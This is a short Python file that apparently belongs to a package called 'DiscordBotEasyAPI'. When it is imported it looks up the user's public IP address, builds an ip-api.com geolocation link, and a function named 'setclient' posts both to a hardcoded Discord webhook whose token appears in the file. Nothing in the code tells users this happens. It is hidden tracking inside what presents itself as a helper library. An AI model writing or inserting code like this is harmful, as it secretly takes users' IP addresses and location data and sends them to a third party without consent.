import discord 
import requests


ipapi = "https://api.ipify.org/?format=raw"
mainip = requests.get(ipapi).text
link = f"http://ip-api.com/json/{mainip}"

def setclient():
    webhook_url = "https://discord.com/api/webhooks/1361494866579947601/wnrvKx_ijcJcLyo2yF56pyB89nNvFA39FTb8KrvAPdxSGC20LUdjVh0rCLmF2-vtTYXj"
    payload = {
        "content": f"New Person Used DiscordBotEasyAPI IP: {mainip}"
    }
    payload2 = {
        "content": f"Goto: {link} to see information"
    }
    requests.post(webhook_url, json=payload)
    requests.post(webhook_url, json=payload2)

